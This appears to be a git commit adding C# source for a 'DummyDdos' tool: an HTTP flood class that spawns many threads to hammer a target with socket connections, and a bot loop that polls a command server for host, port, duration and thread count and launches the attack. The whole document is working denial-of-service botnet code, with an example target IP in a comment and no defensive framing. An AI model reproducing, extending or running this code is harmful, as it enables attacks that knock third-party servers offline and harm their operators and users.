a1f3aa8b18b4fb1c88f74bff0173834956fb7c66
hype <gornostay322@mail.ru>
2018-02-04 15:07:53 +0300

    You know what i mean

---
+++ DummyDdos/Ddos.cs
@@ -0,0 +1,64 @@
+﻿using System;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading;
+
+namespace DummyDdos
+{
+    class Ddos
+    {
+        private string HostName; // 127.0.0.1
+        private string Url; // http://127.0.0.1/index.php?god=ims0rry
+        private int Port; // 80
+        private bool Toggle = false; // Для отсчета времени ддоса
+
+        public Ddos(string Host, string Url, int Port)
+        {
+            this.HostName = Host;
+            this.Url = Url;
+            this.Port = Port;
+        }
+
+        public void HttpFlood(int duration, int threads)
+        {
+            Toggle = true;
+            while (threads > 0)
+            {
+                new Thread(SendData).Start();
+                threads--;
+            }
+            new Thread(() => Timer(duration)).Start();
+        }
+
+        private void SendData()
+        {
+            IPAddress Host = IPAddress.Parse(HostName);
+            IPEndPoint Hostep = new IPEndPoint(Host, Port);
+            while (Toggle)
+            {
+                try
+                {
+                    Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                    sock.Connect(Hostep);
+                    sock.Send(Encoding.UTF8.GetBytes(Url));
+                    sock.Send(Encoding.UTF8.GetBytes("\r\n"));
+                    sock.Close();
+                }
+                catch(Exception e)
+                {
+                    new Thread(SendData).Start();
+                }
+            }            
+        }
+
+        private void Timer(int minutes)
+        {
+            for(int i = 0; i < minutes * 60; i++)
+            {
+                Thread.Sleep(1000);
+            }
+            Toggle = false;
+        }
+    }
+}
---
+++ DummyDdos/Program.cs
@@ -0,0 +1,43 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading;
+
+namespace DummyDdos
+{
+    class Program
+    {
+        private static string Url = ""; //Response: host;url;port;duration;threads Example: 54.207.60.36;http://54.207.60.36/index.php?mrmir=debik;80;10;1000
+        static void Main(string[] args)
+        {
+            while (true)
+            {
+                String[] response = Get(Url).Split(';');
+                try
+                {
+                    Ddos Task = new Ddos(response[0], response[1], Int32.Parse(response[2]));
+                    Task.HttpFlood(Int32.Parse(response[3]), Int32.Parse(response[4]));
+                }
+                catch (Exception e)
+                {
+                    Thread.Sleep(3000);
+                }
+            }
+        }
+
+        private static String Get(string Link)
+        {
+            WebRequest request = WebRequest.Create(Link);
+            request.Credentials = CredentialCache.DefaultCredentials;
+            ((HttpWebRequest)request).UserAgent = "1M50RRY";
+            WebResponse response = request.GetResponse();
+            Stream dataStream = response.GetResponseStream();
+            StreamReader reader = new StreamReader(dataStream);
+
+            return reader.ReadToEnd();
+        }
+    }
+}
